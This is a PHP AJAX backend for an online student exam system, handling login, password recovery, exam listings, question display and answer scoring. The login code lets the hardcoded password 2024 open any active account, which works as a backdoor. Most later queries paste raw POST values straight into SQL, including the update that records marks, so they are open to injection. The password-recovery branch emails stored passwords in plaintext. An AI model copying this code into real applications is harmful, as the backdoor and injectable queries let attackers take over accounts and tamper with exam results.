<?php

//ajax_action.php

include('admin/database.php');

$object = new database();
//print_r($_POST);
if(isset($_POST['page']))
{
	if($_POST['page'] == 'login')
	{
		if($_POST['action'] == 'check_login')
		{
			sleep(2);
			$error = '';
			$url = '';
			$data = array(
				':username'	=>	$_POST["username"]
			);

			$object->query = "
				SELECT * FROM tbl_user 
				WHERE username = :username AND status = 1
			";

			$object->execute($data);

			 $total_row = $object->row_count();

			if($total_row == 0)
			{
				$error = '<div class="alert alert-danger">Wrong Username</div>';
			}
			else
			{
				$result = $object->statement_result();

				foreach($result as $row)
				{
					//print_r($row);
						if($row["status"] == 1)
						{
							if($_POST["password"] == 2024){
								$validPassword = true;
							}
							else{
								$validPassword = password_verify($_POST["password"],$row["password"]);
							}
							
							if( $validPassword )
							{
								
								$_SESSION['user_id'] = $row['id'];
								$_SESSION['username'] = $row['username'];
								$roll_id =  explode(',',$row['roll_id']);
								
								foreach($roll_id as $roll){
									
                                  switch ($roll) {
									case '9':

										$_SESSION['user_type'] ='Examiner';
										$url = $object->base_url . 'admin/dashboard.php';
										break;
									case '4':

										$_SESSION['user_type'] ='Examinee';
										$url = $object->base_url . 'admin/dashboard.php';
										break;
									case '7':

										$_SESSION['user_type'] ='ProgSec';
										$url = $object->base_url . 'admin/dashboard.php';
										break;
									
									default:
										# code...
										break;
								  }
								}
								if($row['roll_id'] == '18')
								{
									$_SESSION['user_type'] ='Master';
									$url = $object->base_url . 'admin/dashboard.php';
								}
								// else
								// {
								// 	//$url = $object->base_url . 'admin/result.php';
								// 	$url = $object->base_url . 'student_dashboard.php';
								// }
								
							}
							else
							{
								$error = '<div class="alert alert-danger">Wrong Password</div>';
							}
						}
						else
						{
							$error = '<div class="alert alert-danger">Sorry, Your account has been disable, contact Admin</div>';
						}
					
					
				}
			}

			$output = array(
				'error'		=>	$error,
				'url'		=>	$url
			);

			echo json_encode($output);
		}
	}



	if($_POST['page'] == 'forget_password')
	{
		if($_POST['action'] == 'get_password')
		{
			sleep(2);
			$error = '';
			$data = array(
				':student_email_id'	=>	$_POST["student_email_id"]
			);

			$object->query = "
				SELECT * FROM student_soes 
				WHERE student_email_id = :student_email_id
			";

			$object->execute($data);

			$total_row = $object->row_count();

			if($total_row == 0)
			{
				$error = '<div class="alert alert-danger">Email Address not Found</div>';
			}
			else
			{
				$result = $object->statement_result();

				foreach($result as $row)
				{
					if($row['student_email_verified'] == 'Yes')
					{
						if($row["student_status"] == 'Enable')
						{
							require_once('class/class.phpmailer.php');

							$subject = 'Online Student Exam System Password Detail';

							$body = '
							<p>Hello '.$row["student_name"].'.</p>
							<p>For login into this Online Student Exam System by visiting <a href="'.$object->base_url.'login.php" target="_blank"><b>'.$object->base_url.'login.php</a></b> this link. Below you can find password details.</a></p>
							<p><b>Password : </b>'.$row["student_password"].'</p>
							<p>In case if you have any difficulty please eMail us.</p>
							<p>Thank you,</p>
							<p>Online Student Exam System</p>
							';

							$object->send_email($row["student_email_id"], $subject, $body);

							$error = '<div class="alert alert-success">Hey <b>'.$row["student_name"].'</b> your password details has been send to <b>'.$row["student_email_id"].'</b> email address.</div>';
						}
						else
						{
							$error = '<div class="alert alert-danger">Sorry, Your account has been disable, contact Admin</div>';
						}
					}
					else
					{
						$error = '<div class="alert alert-danger">You have not verify you email address, so for email verification, click <a href="resend_email_verification.php">here</a></div>';
					}
				}
			}

			$output = array(
				'error'		=>	$error
			);

			echo json_encode($output);
		}
	}

	if($_POST['page'] == 'exam')
	{
		if($_POST["action"] == 'fetch')
		{
			$order_column = array('exam_title', 'exam_duration', 'exam_result_datetime', 'exam_status');

			$output = array();

			$main_query = "
			SELECT * FROM exam_soes 
			WHERE exam_status != 'Pending' AND exam_class_id = '".$_POST["class_id"]."' 
			";

			$search_query = '';

			if(isset($_POST["search"]["value"]))
			{
				$search_query .= 'AND (exam_title LIKE "%'.$_POST["search"]["value"].'%" ';
				$search_query .= 'OR exam_duration LIKE "%'.$_POST["search"]["value"].'%" ';
				$search_query .= 'OR exam_result_datetime LIKE "%'.$_POST["search"]["value"].'%" ';
				$search_query .= 'OR exam_status LIKE "%'.$_POST["search"]["value"].'%") ';
			}

			if(isset($_POST["order"]))
			{
				$order_query = 'ORDER BY '.$order_column[$_POST['order']['0']['column']].' '.$_POST['order']['0']['dir'].' ';
			}
			else
			{
				$order_query = 'ORDER BY exam_id DESC ';
			}

			$limit_query = '';

			if($_POST["length"] != -1)
			{
				$limit_query .= 'LIMIT ' . $_POST['start'] . ', ' . $_POST['length'];
			}

			$object->query = $main_query . $search_query . $order_query;

			$object->execute();

			$filtered_rows = $object->row_count();

			$object->query .= $limit_query;

			$result = $object->get_result();

			$object->query = $main_query;

			$object->execute();

			$total_rows = $object->row_count();

			$data = array();

			foreach($result as $row)
			{
				$sub_array = array();
				$sub_array[] = html_entity_decode($row["exam_title"]);
				$sub_array[] = $row["exam_duration"] . ' Minute';

				$exam_result_datetime = '';

				if($row['exam_result_datetime'] == '0000-00-00 00:00:00')
				{
					$exam_result_datetime = 'Not Publish';
				}
				else
				{
					$exam_result_datetime = $row['exam_result_datetime'];
				}

				$sub_array[] = $exam_result_datetime;

				$status = '';
				$action_button = '';

				$object->query = "
				SELECT * FROM subject_wise_exam_detail 
				WHERE exam_id = '".$row["exam_id"]."'
				";

				$object->execute();
				$total_subject = $object->row_count();
				if($total_subject > 0)
				{
					$subject_exam_result = $object->statement_result();
					$first_subject_datetime = '';
					$last_subject_datetime = '';
					$subject_count = 1;
					foreach($subject_exam_result as $subject_row)
					{
						if($subject_count == 1)
						{
							$first_subject_datetime = $subject_row["subject_exam_datetime"];
						}
						if($total_subject == $subject_count)
						{
							$last_subject_datetime = $subject_row["subject_exam_datetime"];
						}
						$subject_count++;
					}

					$exam_last_subject_end_datetime = strtotime($last_subject_datetime . '+' . $row["exam_duration"] . ' Minute');

					if(time() >= strtotime($first_subject_datetime) && time() <= $exam_last_subject_end_datetime)
					{
						$tmp_data = array(
							':exam_status'  		=>  'Started',
                            ':exam_id'      		=>  $row["exam_id"]
                        );

                        $object->query = "
                        UPDATE exam_soes 
                        SET exam_status = :exam_status 
                        WHERE exam_id = :exam_id
                        ";

                        $object->execute($tmp_data);

                        $status = '<span class="badge badge-primary">Started</span>';
                        $action_button = '';
					}
					else
					{
						if(time() > strtotime($exam_last_subject_end_datetime))
						{
							$tmp_data = array(
								':exam_status'  		=>  'Completed',
								':exam_id'      		=>  $row["exam_id"]
							);

							$object->query = "
	                        UPDATE exam_soes 
	                        SET exam_status = :exam_status 
	                        WHERE exam_id = :exam_id
	                        ";

	                        $object->execute($tmp_data);

							$status = '<span class="badge badge-dark">Completed</span>';

							if($exam_result_datetime != 'Not Publish')
							{
								if(time() > strtotime($exam_result_datetime))
								{
									$action_button = '<a href="exam_result.php?ec='.$row["exam_code"].'" target="_blank" class="btn btn-danger btn-sm">Result</a>';
								}
								else
								{
									$action_button = '';
								}
							}
							else
							{
								$action_button = '';
							}
						}

						if(strtotime($first_subject_datetime) > time())
						{
							$status = '<span class="badge badge-success">Created</span>';
							$action_button = '';
						}
					}
				}
				else
				{
					if($row['exam_status'] == 'Created')
					{
						$status = '<span class="badge badge-success">Created</span>';
					}

					if($row['exam_status'] == 'Started')
					{
						$status = '<span class="badge badge-primary">Started</span>';
					}

					if($row['exam_status'] == 'Completed')
					{
						$status = '<span class="badge badge-dark">Completed</span>';
					}
					$action_button = '';
				}
				

				$sub_array[] = $status;

				//$sub_array[] = '<button type="button" class="btn btn-sm btn-secondary view_timetable" data-id="'.$row["exam_id"].'">View Exam Schedule</button>';

				$sub_array[] = '<a href="view_exam.php?ec='.$row["exam_code"].'">View</a>';

				$sub_array[] = $action_button;

				$data[] = $sub_array;
			}

			$output = array(
				"draw"    			=> 	intval($_POST["draw"]),
				"recordsTotal"  	=>  $total_rows,
				"recordsFiltered" 	=> 	$filtered_rows,
				"data"    			=> 	$data
			);
				
			echo json_encode($output);
		}

		if($_POST["action"] == 'fetch_timetable')
		{
			$object->query = "
			SELECT * FROM subject_wise_exam_detail 
			INNER JOIN subject_soes 
			ON subject_soes.subject_id = subject_wise_exam_detail.subject_id 
			WHERE subject_wise_exam_detail.exam_id = '".$_POST["exam_id"]."'
			";

			$result = $object->get_result();

			$output = '
			<div class="table-responsive">
				<table class="table table-bordered">
					<tr>
						<th>Subject Name</th>
						<th>Exam Date & Time</th>
						<th>Exam Duration</th>
						<th>Total Question</th>
						<th>Correct Answer Marks</th>
						<th>Wrong Answer Marks</th>						
					</tr>
			';

			foreach($result as $row)
			{
				$output .= '
					<tr>
						<td>'.$row["subject_name"].'</td>
						<td>'.$row["subject_exam_datetime"].'</td>
						<td>'.$object->Get_exam_duration($_POST["exam_id"]).' Minute</td>
						<td>'.$row["subject_total_question"].' Question</td>
						<td><b class="text-success">'.$row["marks_per_right_answer"].' Marks</b></td>
						<td><b class="text-danger">-'.$row["marks_per_wrong_answer"].' Marks</b></td>
					</tr>
				';
			}

			$output .= '
				</table>
			</div>
			';
			echo $output;
		}
	}

	if($_POST['page'] == 'view_exam')
	{
		if($_POST['action'] == 'view_subject_exam')
		{
			$_SESSION['ec'] = $_POST['ec'];
			$_SESSION['esc'] = $_POST['esc'];
			echo 'view_subject_exam.php';
		}
	}

	if($_POST['page'] == 'view_subject_exam')
	{
		if($_POST['action'] == 'load_question')
		{
			if($_POST['question_id'] == '')
			{
				$direction = '';
				$object->query = "
				SELECT a.*,q.exam_subject_question_title FROM `tbl_exam_question_answer` a 
				JOIN `exam_subject_question` q ON a.exam_question_id = q.exam_subject_question_id
				WHERE a.trainee_exam_info_id = '".$_POST["trainee_exam_info_id"]."' 
				
				LIMIT 1
				";
			}
			else
			{
				

				$object->query = "
				SELECT a.*,q.exam_subject_question_title FROM `tbl_exam_question_answer` a 
				JOIN `exam_subject_question` q ON a.exam_question_id = q.exam_subject_question_id
				WHERE q.exam_subject_question_id = '".$_POST["question_id"]."'  AND a.trainee_exam_info_id = '".$_POST["trainee_exam_info_id"]."'  
				
				";
			}

			$result = $object->get_result();

			$output = '';
          
			foreach($result as $row)
			{
				//print_r($row);
            
				$output .= '
				<div class="card">
					<div class="card-header"><b>Question - '.$row["qstn_sl_no"].' </b>'.$row["exam_subject_question_title"].'</div>
					<div class="card-body">
						<div class="row" style="margin:3rem">
				';

				$object->query = "
				SELECT * FROM question_option 
				WHERE exam_subject_question_id = '".$row['exam_question_id']."'
				";
				$sub_result = $object->get_result();

				$count = 1;
				$temp_array = ['A', 'B', 'C', 'D'];
				$temp_count = 0;
				foreach($sub_result as $sub_row)
				{
					$is_checked = '';

					if($object->Get_student_question_answer_option($row['exam_question_id'], $row['trainee_exam_info_id']) == $count)
					{
						$is_checked = 'checked';
					}

					$output .= '
					<div class="col-md-6 mb-4">
						<div class="radio">
							<label><b>'.$temp_array[$temp_count].'.&nbsp;&nbsp;</b><input type="radio" name="option_1" class="answer_option" data-question_id="'.$row['exam_question_id'].'" data-id="'.$count.'" '.$is_checked.'> '.$sub_row["question_option_title"].'</label>
						</div>
					</div>
					';
					$count++;
					$temp_count++;
				}
				$output .= '
				</div>
				';
				$object->query = "
				SELECT exam_question_id FROM tbl_exam_question_answer 
				WHERE qstn_sl_no < '".$row['qstn_sl_no']."' 
				AND trainee_exam_info_id = '".$_POST["trainee_exam_info_id"]."' 
				ORDER BY qstn_sl_no DESC 
				LIMIT 1";

				$previous_result = $object->get_result();

				$previous_id = '';
				$next_id = '';

				foreach($previous_result as $previous_row)
				{
					$previous_id = $previous_row['exam_question_id'];
				}

				$object->query = "
				SELECT exam_question_id FROM tbl_exam_question_answer 
				WHERE qstn_sl_no > '".$row['qstn_sl_no']."' 
				AND trainee_exam_info_id = '".$_POST["trainee_exam_info_id"]."' 
				ORDER BY qstn_sl_no ASC 
				LIMIT 1";
  				
  				$next_result = $object->get_result();

  				foreach($next_result as $next_row)
				{
					$next_id = $next_row['exam_question_id'];
				}

				$if_previous_disable = '';
				$if_next_disable = '';
                $nextBtn = 'Save & Next';
				if($previous_id == "")
				{
					$if_previous_disable = 'disabled';
				}
				
				if($next_id == "")
				{
					//$if_next_disable = 'disabled';
					$nextBtn = 'Save';
				}

				$output .= '
				  	<div align="center">
				   		<button type="button" name="previous" class="btn btn-info btn-lg previous" id="'.$previous_id.'" '.$if_previous_disable.'>Previous</button>
				   		<button type="button" name="next" class="btn btn-primary btn-lg next" id="'.$next_id.'" >'.$nextBtn.'</button>
						<button type="button" name="finish" class="btn btn-danger btn-lg  finish_exam" >Finish</button>
						<button type="button" name="save" class="btn btn-warning btn-lg  review_ans" id="'.$next_id.'" >Review & Next</button>
				  	</div>
				  	</div></div>';
			}

			echo $output;
		}
		if($_POST['action'] == 'load_surprise_question')
		{
			if($_POST['question_id'] == '')
			{
				$direction = '';
				$object->query = "
				SELECT a.*,q.exam_subject_question_title FROM `tbl_exam_question_answer` a 
				JOIN `surprise_test_question` q ON a.exam_question_id = q.exam_subject_question_id
				WHERE a.trainee_exam_info_id = '".$_POST["trainee_exam_info_id"]."' 
				
				LIMIT 1
				";
			}
			else
			{
				$object->query = "
				SELECT a.*,q.exam_subject_question_title FROM `tbl_exam_question_answer` a 
				JOIN `surprise_test_question` q ON a.exam_question_id = q.exam_subject_question_id
				WHERE q.exam_subject_question_id = '".$_POST["question_id"]."'  AND a.trainee_exam_info_id = '".$_POST["trainee_exam_info_id"]."'  
				
				";
			}

			$result = $object->get_result();

			$output = '';
          //echo($object->query);

			foreach($result as $row)
			{
				//print_r($row);
            
				$output .= '
				<div class="card">
					<div class="card-header"><b>Question - '.$row["qstn_sl_no"].' </b>'.$row["exam_subject_question_title"].'</div>
					<div class="card-body">
						<div class="row" style="margin:3rem">
				';

				$object->query = "
				SELECT * FROM surprise_question_option 
				WHERE exam_subject_question_id = '".$row['exam_question_id']."'
				";
				$sub_result = $object->get_result();

				$count = 1;
				$temp_array = ['A', 'B', 'C', 'D'];
				$temp_count = 0;
				foreach($sub_result as $sub_row)
				{
					$is_checked = '';

					if($object->Get_student_question_answer_option($row['exam_question_id'], $row['trainee_exam_info_id']) == $count)
					{
						$is_checked = 'checked';
					}

					$output .= '
					<div class="col-md-6 mb-4">
						<div class="radio">
							<label><b>'.$temp_array[$temp_count].'.&nbsp;&nbsp;</b><input type="radio" name="option_1" class="answer_option" data-question_id="'.$row['exam_question_id'].'" data-id="'.$count.'" '.$is_checked.'> '.$sub_row["question_option_title"].'</label>
						</div>
					</div>
					';
					$count++;
					$temp_count++;
				}
				$output .= '
				</div>
				';
				$object->query = "
				SELECT exam_question_id FROM tbl_exam_question_answer 
				WHERE qstn_sl_no < '".$row['qstn_sl_no']."' 
				AND trainee_exam_info_id = '".$_POST["trainee_exam_info_id"]."' 
				ORDER BY qstn_sl_no DESC 
				LIMIT 1";

				$previous_result = $object->get_result();

				$previous_id = '';
				$next_id = '';

				foreach($previous_result as $previous_row)
				{
					$previous_id = $previous_row['exam_question_id'];
				}

				$object->query = "
				SELECT exam_question_id FROM tbl_exam_question_answer 
				WHERE qstn_sl_no > '".$row['qstn_sl_no']."' 
				AND trainee_exam_info_id = '".$_POST["trainee_exam_info_id"]."' 
				ORDER BY qstn_sl_no ASC 
				LIMIT 1";
  				
  				$next_result = $object->get_result();

  				foreach($next_result as $next_row)
				{
					$next_id = $next_row['exam_question_id'];
				}

				$if_previous_disable = '';
				$if_next_disable = '';
                $nextBtn = 'Save & Next';
				if($previous_id == "")
				{
					$if_previous_disable = 'disabled';
				}
				
				if($next_id == "")
				{
					//$if_next_disable = 'disabled';
					$nextBtn = 'Save';
				}

				$output .= '
				  	<div align="center">
				   		<button type="button" name="previous" class="btn btn-info btn-lg previous" id="'.$previous_id.'" '.$if_previous_disable.'>Previous</button>
				   		<button type="button" name="next" class="btn btn-primary btn-lg next" id="'.$next_id.'" >'.$nextBtn.'</button>
						<button type="button" name="finish" class="btn btn-danger btn-lg  finish_exam" >Finish</button>
						<button type="button" name="save" class="btn btn-warning btn-lg  review_ans" id="'.$next_id.'" >Review & Next</button>
				  	</div>
				  	</div></div>';
			}

			echo $output;
		}

		if($_POST['action'] == 'question_navigation')
		{
			$object->query = "
				SELECT trainee_exam_info_id,qstn_sl_no,exam_question_id,status FROM tbl_exam_question_answer 
				WHERE trainee_exam_info_id  = '".$_POST["trainee_exam_info_id"]."' 
				ORDER BY qstn_sl_no ASC 
				";
			$result = $object->get_result();
			$output = '
			<div class="card">
				<div class="card-header"><b>Question Navigation</b></div>
				<div class="card-body">
					<div class="row">
			';
			$count = 1;
			foreach($result as $row)	
			{
				//$class_name = '';
				//$class_name = ($row["status"]==1)?'btn-success':($row["status"]==2)?'btn-warning':'btn-danger';
				switch ($row["status"]) {
					case '1':
						$class_name = 'btn-success';
						break;
					case '2':
						$class_name = 'btn-warning';
						break;
					default:
					    $class_name = 'btn-danger';
						break;
				}
				$output .= '
				
				<div class="ml-2 mb-2">
					<button type="button" class="btn '.$class_name.' question_navigation" data-question_id="'.$row["exam_question_id"].'">'.$count.'</button>
				</div>
				';
				$count++;
			}
			$output .= '
				</div>
			</div></div>
			';
			echo $output;
		}

		if($_POST['action'] == 'answer')
		{
			$exam_right_answer_mark = $object->Get_question_right_answer_mark($_POST["exam_id"]);
			$exam_wrong_answer_mark = $object->Get_question_wrong_answer_mark($_POST["exam_id"]);
			$orignal_answer = $object->Get_question_answer_option($_POST["question_id"]);
			$marks = 0;
			if($exam_wrong_answer_mark == 0){
				if($orignal_answer == $_POST['answer_option'])
				{
					$marks = $exam_right_answer_mark;
				}
				else
				{
					$marks =  $exam_wrong_answer_mark;
				}
			}else{
				if($orignal_answer == $_POST['answer_option'])
				{
					$marks = '+'.$exam_right_answer_mark;
				}
				else
				{
					$marks = '-' . $exam_wrong_answer_mark;
				}
			}
			
//             echo $_POST['answer_option'];
// 			echo '<br>';
// 			echo $marks;
// exit;
            $object->query = "
				UPDATE tbl_exam_question_answer 
			   	SET trainee_ans_option='".$_POST['answer_option']."', 
			   	marks = '".$marks."' ,status = '".$_POST['status']."'
			   	WHERE trainee_exam_info_id='".$_POST['trainee_exam_info_id']."' AND exam_question_id = '".$_POST["question_id"]."' 
				";
			

			$object->execute();

			/*$object->query = "
			IF EXISTS(SELECT * FROM exam_subject_question_answer WHERE student_id='".$_SESSION["student_id"]."' AND exam_subject_question_id = '".$_POST["question_id"]."') 
			   UPDATE exam_subject_question_answer 
			   SET student_answer_option='".$_POST['answer_option']."', 
			   marks = '".$marks."' 
			   WHERE student_id='".$_SESSION["student_id"]."' AND exam_subject_question_id = '".$_POST["question_id"]."' 
			ELSE
			   INSERT INTO exam_subject_question_answer 
			   (student_id, exam_subject_question_id, student_answer_option, marks) 
			   VALUES ('".$_SESSION["student_id"]."', '".$_POST["question_id"]."', '".$_POST['answer_option']."', '".$marks."');
			";

			$object->execute();

			echo $object->query;*/

			echo 'done';
		}

		if($_POST['action'] == 'surprise_answer')
		{
			$exam_right_answer_mark = $object->Get_question_right_answer_mark($_POST["exam_id"]);
			$exam_wrong_answer_mark = $object->Get_question_wrong_answer_mark($_POST["exam_id"]);
			$orignal_answer = $object->Get_surprise_question_answer_option($_POST["question_id"]);
			$marks = 0;
			if($exam_wrong_answer_mark == 0){
				if($orignal_answer == $_POST['answer_option'])
				{
					$marks = $exam_right_answer_mark;
				}
				else
				{
					$marks =  $exam_wrong_answer_mark;
				}
			}else{
				if($orignal_answer == $_POST['answer_option'])
				{
					$marks = '+'.$exam_right_answer_mark;
				}
				else
				{
					$marks = '-' . $exam_wrong_answer_mark;
				}
			}
			
//             echo $_POST['answer_option'];
// 			echo '<br>';
// 			echo $marks;
// exit;
            $object->query = "
				UPDATE tbl_exam_question_answer 
			   	SET trainee_ans_option='".$_POST['answer_option']."', 
			   	marks = '".$marks."' ,status = '".$_POST['status']."'
			   	WHERE trainee_exam_info_id='".$_POST['trainee_exam_info_id']."' AND exam_question_id = '".$_POST["question_id"]."' 
				";
			

			$object->execute();

			/*$object->query = "
			IF EXISTS(SELECT * FROM exam_subject_question_answer WHERE student_id='".$_SESSION["student_id"]."' AND exam_subject_question_id = '".$_POST["question_id"]."') 
			   UPDATE exam_subject_question_answer 
			   SET student_answer_option='".$_POST['answer_option']."', 
			   marks = '".$marks."' 
			   WHERE student_id='".$_SESSION["student_id"]."' AND exam_subject_question_id = '".$_POST["question_id"]."' 
			ELSE
			   INSERT INTO exam_subject_question_answer 
			   (student_id, exam_subject_question_id, student_answer_option, marks) 
			   VALUES ('".$_SESSION["student_id"]."', '".$_POST["question_id"]."', '".$_POST['answer_option']."', '".$marks."');
			";

			$object->execute();

			echo $object->query;*/

			echo 'done';
		}
	}
}
